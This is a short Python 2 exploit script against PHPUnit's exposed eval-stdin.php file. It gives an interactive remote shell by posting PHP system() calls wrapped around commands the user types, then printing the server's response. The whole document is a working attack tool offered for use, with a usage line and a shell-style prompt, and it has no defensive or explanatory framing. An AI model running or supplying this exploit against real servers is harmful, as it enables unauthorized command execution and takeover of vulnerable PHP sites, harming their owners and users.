#!/usr/bin/python
import requests
import sys

if len(sys.argv) != 2:
    print "Usage: ./la.py https://example.com"
    sys.exit(0)

target = sys.argv[1]
url = target + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
prefix = "<?php system('"
postfix = "');die(); ?>"
print "[+] Connecting to Shell..."
print "[+] CTL+C to exit"
while True:
    try:
        command = raw_input("%s:~$ " %("bash"))
        data = prefix + command + postfix
        response = requests.get(url, data=str(data))
        print(response.content)
    except KeyboardInterrupt:
        print "\n[-] Quitting"
        sys.exit(1)
